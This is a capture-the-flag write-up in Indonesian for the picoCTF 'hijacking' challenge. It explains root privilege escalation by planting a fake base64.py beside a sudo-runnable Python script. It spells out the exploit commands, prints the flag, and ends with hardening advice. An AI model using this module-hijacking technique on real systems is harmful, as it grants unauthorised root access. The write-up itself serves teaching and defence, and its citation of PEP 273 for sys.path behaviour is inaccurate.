# Writeup: hijacking (Challenge ID: 352)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Linux Privilege Escalation & Python Module Hijacking (CWE-250 / CWE-732 / CWE-427)
- **Difficulty:** Medium (diff=2)
- **Event:** picoCTF 2023
- **Points:** 200
- **Author:** LT 'syreal' Jones
- **Flag Resmi:** `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`
- **Standar Audit:** NIST SP 800-115 § 4.2 (Vulnerability Analysis) & § 4.3 (Verification)

---

## Problem Statement & Scope

Tantangan `hijacking` menyediakan akses terminal interaktif berbasis SSH sebagai pengguna tak berizin istimewa (`academy`). Di dalam direktori beranda pengguna (`/home/academy`), terdapat sebuah skrip tersembunyi milik akun superuser root bernama `.server.py`. Skenario menugaskan peserta melakukan audit konfigurasi hak istimewa sistem operasi Linux, mengeksploitasi celah eskalasi privilese lokal (*Local Privilege Escalation*), dan membaca bendera rahasia pada direktori `/root/flag.txt`.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Prioritas Pencarian Modul CPython (`sys.path[0]` / PEP 273):**
   Ketika interpreter CPython mengeksekusi skrip dari berkas (contoh: `python3 /home/academy/.server.py`), mesin runtime secara otomatis menyisipkan direktori yang memuat skrip tersebut ke posisi indeks pertama daftar pencarian pustaka:
   `sys.path[0] = '/home/academy'`.
   
   Konsekuensi mekanisme ini adalah modul lokal yang berada pada direktori kerja skrip akan selalu diimpor terlebih dahulu sebelum modul pustaka standar sistem yang terpasang pada `/usr/lib/python3.x/`.

2. **Diskrepansi Izin Direktori Sudoers NOPASSWD (CWE-250 / CWE-732):**
   Audit batasan hak akses melalui perintah `sudo -l` mengungkap entri delegasi khusus:
   ```text
   User academy may run the following commands on challenge:
       (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
   ```
   Meskipun berkas skrip target `.server.py` berstatus *read-only* bagi pengguna umum (`-rw-r--r-- 1 root root`), direktori induknya (`/home/academy`) dimiliki penuh oleh pengguna biasa (`drwxr-x--- 1 academy academy`). Pengguna memiliki hak tulis penuh untuk membuat, menimpa, atau memodifikasi berkas lain di dalam direktori tersebut.

3. **Penyusupan Pustaka Bawaan (CWE-427 / Module Hijacking):**
   Inspeksi kode sumber `.server.py` menunjukkan pemanggilan pustaka standar:
   ```python
   import base64
   import os
   import socket
   ```
   Karena direktori `/home/academy` diprioritaskan pada `sys.path[0]`, pembuatan berkas palsu bernama `base64.py` di direktori tersebut memicu pembajakan impor (*library hijacking*). Saat perintah `sudo /usr/bin/python3 /home/academy/.server.py` dijalankan, interpreter memuat dan mengeksekusi kode sembarang di dalam `base64.py` di bawah hak akses superuser root (EUID 0).

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Audit Hak Akses Sudo dan Izin Direktori:**
   Masuk melalui sesi SSH dan periksa hak eksekusi sudo:
   ```bash
   sudo -l
   # Output: (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
   
   ls -ld /home/academy
   # Output: drwxr-x--- 1 academy academy (writable oleh user saat ini)
   ```

2. **Inspeksi Berkas Sasaran `.server.py`:**
   Periksa modul yang diimpor pada skrip root:
   ```bash
   head -n 10 /home/academy/.server.py
   # Ditemukan: import base64, import os, import socket
   ```

3. **Rekayasa Modul Pembajak (`base64.py`):**
   Buat modul palsu yang membaca bendera root dan menampilkannya ke konsol:
   ```bash
   echo 'import os; os.system("cat /root/flag.txt /root/.* 2>/dev/null")' > /home/academy/base64.py
   ```

4. **Pemicuan Eskalasi Hak Istimewa:**
   Jalankan skrip administratif melalui perintah sudo:
   ```bash
   sudo /usr/bin/python3 /home/academy/.server.py
   ```
   CPython memuat `/home/academy/base64.py` dengan hak akses root dan langsung mencetak bendera:
   `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`.

5. **Verifikasi Token Live REST API:**
   Kirim token ke endpoint resmi platform CyLab:
   ```bash
   curl -X POST https://learn.cylabacademy.org/api/submissions/ \
     -H "Content-Type: application/json" \
     -H "X-CSRFToken: <CSRF_TOKEN>" \
     -H "Cookie: sessionid=<SESSION_ID>; csrftoken=<CSRF_TOKEN>" \
     -d '{"challenge": 352, "flag": "academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}"}'
   ```
   Sistem merespons dengan HTTP 201 Created dan status `correct: true`.

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`
- **Status Submisi REST API:** HTTP 201 Created (`correct: true`, `historical: false`).
- **Skrip Reproduktif:** `scripts/solve_352_hijacking.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Relevansi Silabus LKS Cyber Security:**
   - Modul Linux Privilege Escalation: Pemahaman mendalam terkait aturan `/etc/sudoers`, pemisahan hak akses berkas vs direktori induk, serta pemahaman resolusi modul Python runtime (`sys.path`).
   - Modul Defensive Hardening: Evaluasi kepatuhan prinsip *least privilege* dan mitigasi serangan DLL/Shared Object/Module Hijacking pada sistem produksi.

2. **Mitigasi Defensif (Hardening & Remediasi Konfigurasi):**
   - **Relokasi Skrip Administratif:** Seluruh skrip yang didelegasikan melalui sudoers wajib disimpan dalam direktori aman yang dikontrol penuh oleh root (misalnya `/opt/admin-scripts/` atau `/usr/local/bin/`) dengan izin kepemilikan ketat (`root:root`, mode 755 atau 700), dilarang keras menaruh skrip sudo di direktori beranda pengguna biasa.
   - **Penegakan Modus Terisolasi Python (`-I` Flag):** Tambahkan opsi `-I` (*Isolated Mode*) pada perintah sudoers guna mengabaikan `PYTHONPATH`, direktori kerja skrip lokal dari `sys.path`, dan variabel lingkungan pengguna:
     ```text
     academy ALL=(root) NOPASSWD: /usr/bin/python3 -I /opt/admin-scripts/.server.py
     ```
   - **Audit Izin Direktori Berkala:** Gunakan perkakas audit konfigurasi otomatis seperti LinPEAS atau Lynis untuk mendeteksi jalur eksekusi berhak istimewa tinggi yang berada dalam direktori berizin tulis dunia (*world-writable* atau *user-writable*).
